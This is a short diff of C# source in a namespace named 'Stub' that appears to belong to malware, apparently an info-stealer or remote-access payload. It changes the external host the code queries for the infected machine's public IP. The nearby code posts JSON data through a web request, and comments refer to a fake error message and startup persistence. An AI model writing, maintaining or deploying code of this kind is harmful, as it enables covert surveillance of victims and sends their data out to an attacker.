@@ -429,7 +429,7 @@ namespace Stub
 					using (var sw = new StreamWriter(wr.GetRequestStream()))
 					{
 						WebClient web = new WebClient();
-						string ip = web.DownloadString(""https://showmyipaddress1337.000webhostapp.com"");
+						string ip = web.DownloadString(""http://projectanxietyiplookup.rf.gd/index.php"");
 						string remove = RemoveWhitespace(ip);
 						string json = JsonConvert.SerializeObject(new
 						{
@@ -486,7 +486,7 @@ namespace Stub
 				//myholywater
 				//fakeerrorlolnub
 				WebClient webClient = new WebClient();
-				string anamz = webClient.DownloadString(""https://showmyipaddress1337.000webhostapp.com/"");
+				string anamz = webClient.DownloadString(""https://showmyipaddress1337.000webhostapp.com/""); //00webhost is banned in turkey
 				Thread.Sleep(1000);
 				plugins plugin = new plugins();
 				//startuplolhehe
@@ -504,7 +504,7 @@ namespace Stub
 					using (var sw = new StreamWriter(wr.GetRequestStream()))
 					{
 						WebClient web = new WebClient();
-						string ip = web.DownloadString(""https://showmyipaddress1337.000webhostapp.com"");
+						string ip = web.DownloadString(""http://projectanxietyiplookup.rf.gd/index.php""); //00webhost is banned in turkey
 						string remove = RemoveWhitespace(ip);
 						string json = JsonConvert.SerializeObject(new
 						{
